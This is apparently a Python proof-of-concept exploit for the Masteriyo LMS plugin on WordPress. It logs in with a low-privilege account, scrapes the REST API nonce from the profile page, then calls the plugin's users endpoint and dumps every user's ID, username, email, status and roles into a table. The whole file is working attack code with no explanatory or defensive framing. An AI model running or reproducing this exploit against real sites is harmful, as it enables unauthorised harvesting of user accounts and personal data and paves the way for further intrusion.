import requests
import argparse
import urllib3
import json
import re
from bs4 import BeautifulSoup
from tabulate import tabulate

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()

# Setting User-Agent for all requests.
user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
session.headers.update({'User-Agent': user_agent})


def grab_nonce(url):
    response = session.get(""+url+"/wp-admin/profile.php",verify=False)
    
    # Parse the JavaScript code using Beautiful Soup
    soup = BeautifulSoup(response.content, 'html.parser')

    # Find the wpApiSettings script tag
    script_tag = soup.find('script', {'id': 'wp-api-request-js-extra'})

    if script_tag:
        # Extract the JavaScript code within the script tag
        js_code = script_tag.string
    
        # Extract the nonce value from the JavaScript code
        nonce_value = None
        start_index = js_code.find('"nonce":"') + 9
        end_index = js_code.find('"', start_index)
        if start_index != -1 and end_index != -1:
            nonce_value = js_code[start_index:end_index]

        if nonce_value:
            print("Nonce Value:", nonce_value)
            return nonce_value
        else:
            print("Nonce value not found.")
    else:
        print("Script tag not found.")

def login_to_wordpress(url, username, password):
    # Create a session
    

    # Prepare login data
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': '1',
        'redirect_to': url + '/wp-admin/profile.php'
    }

    # Send a POST request to the login page
    response = session.post(url + '/wp-login.php', data=login_data, verify=False)

    # Check if login was successful
    if any('wordpress_logged_in' in cookie.name for cookie in session.cookies):
        print('Logged in successfully.')
        return True
    else:
        print('Failed to log in.')
        return None
        
        
def send_post_request(url,nonce):
    session.headers.update({'User-Agent': user_agent,'X-WP-Nonce': nonce,'Referer': ''+url+'/wp-admin/admin.php?page=masteriyo','Accept': 'application/json, /;q=0.1'})
    response = session.get(""+url+"/wp-json/masteriyo/v1/users/")

    if response.status_code == 200:
       data = json.loads(response.text)
       extracted_data = []
       for item in data['data']:
           extracted_data.append({
        'id': item['id'],
        'username': item['username'],
        'nicename': item['nicename'],
        'email': item['email'],
        'status': item['status'],
        'roles': item['roles'],
        'profile_image': item['profile_image']
           })

       # Print extracted data in table format
       headers = ['ID', 'Username', 'Nicename', 'Email', 'Status', 'Roles', 'Profile Image']
       table = []
       for item in extracted_data:
           row = [item['id'], item['username'], item['nicename'], item['email'], item['status'], item['roles'], item['profile_image']['url']]
           table.append(row)

       print(tabulate(table, headers=headers, tablefmt='grid'))
    else:
       print("User does not have permissions")
      


    
    
    
    
    
    
    
    
def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='WordPres')
    parser.add_argument("-w", "--url", required=True, help="URL of the WordPress site")
    parser.add_argument("-u", "--username", required=True, help="Username of your wordpress user")
    parser.add_argument("-p", "--password", required=True, help="Password of your wordpress password")
    args = parser.parse_args()

    # Log in to WordPress
    session = login_to_wordpress(args.url, args.username, args.password)
    if session is None:
        return
    nonce = grab_nonce(args.url)
    # Send the POST request
    send_post_request(args.url,nonce)

if __name__ == '__main__':
    main()
